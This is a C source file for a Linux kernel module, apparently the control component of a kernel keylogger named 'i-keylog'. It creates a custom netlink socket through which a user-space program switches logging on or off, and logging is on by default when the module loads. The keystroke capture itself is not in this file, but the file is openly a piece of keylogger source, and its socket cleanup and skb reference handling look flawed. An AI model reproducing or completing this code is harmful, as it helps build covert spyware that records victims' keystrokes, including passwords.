#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <asm/unistd.h>
#include <linux/workqueue.h>
#include <asm/uaccess.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/netdevice.h>
#include <linux/skbuff.h>
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/netlink.h>
#include <net/sock.h>

/*
 * define your own netlink protocol
 * see the unused NETLINK_XXX in <linux/netlink.h>
 */
#define NETLINK_IKEY 29 

static int switchon;
static struct sock *sp;

int getswitch(void)
{
	return switchon;
}

void nlcall(struct sk_buff *__skb) 
{
	pid_t pid;
	struct sk_buff *skb;
	struct nlmsghdr *nlh;
	int data = 0;
	
	/*
	 * get true skb
	 */
	skb = skb_get(__skb);

	/*
	 * length of actual data must be bigger than
	 * NLMSG_LENTH
	 */
	if (skb->len >= NLMSG_SPACE(0)) {
		/*
		 * skb->data
		 */
		nlh = nlmsg_hdr(skb);	
		/*
		 * nlh + NLMSG_LENTH -->data
		 */
		memcpy((void *)&data, NLMSG_DATA(nlh), sizeof(data));
		pid = nlh->nlmsg_pid;
		/*
		 * H E is from my own user program! 
		 */
		if (data == 1) {
			switchon = 1;
			printk(KERN_ALERT "[i-keylog] process %d switch on\n", pid);
		}
		else if (data == 0) {
			switchon = 0;
			printk(KERN_ALERT "[i-keylog] process %d switch off\n", pid);
		}
		else {
			printk(KERN_ALERT "[i-keylog] process %d unknown control\n", pid);
		}
		kfree_skb(skb);

	}
	else {
		printk(KERN_ALERT "[i-keylog] unknown control\n");

	}
}

int nlswitch_init(void)
{
	/*
 	 * Don't know init_net:-(
 	 * And I set mutex to NULL
 	 */
	sp = netlink_kernel_create(&init_net, NETLINK_IKEY, 0,
					nlcall, NULL, THIS_MODULE);
	if (sp == NULL)	{
		printk(KERN_ALERT "[i-keylog] nlcreate error\n");
		return -1;
	}
		
	switchon = 1;

	printk(KERN_ALERT "[i-keylog] nlswitch ok\n");
	return 0;
}

void nlswitch_exit(void)
{
	/*
	 * sock_release (struct socket*)
	 */
	if (sp != NULL)	
		sock_release(sp->sk_socket);
	printk(KERN_ALERT "[i-keylog] nlswitch exit\n");

}
